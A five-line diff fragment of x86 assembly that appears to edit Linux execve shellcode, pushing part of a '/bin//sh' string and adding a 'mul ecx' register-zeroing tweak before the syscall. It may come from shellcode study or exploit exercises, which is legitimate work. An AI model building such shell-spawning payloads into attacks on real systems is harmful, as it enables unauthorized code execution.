@@ -60,5 +60,6 @@ _start:
     push 0x69622f2f
     mov ebx, esp
 
+    mul ecx
     mov al, 0xb
     int 0x80
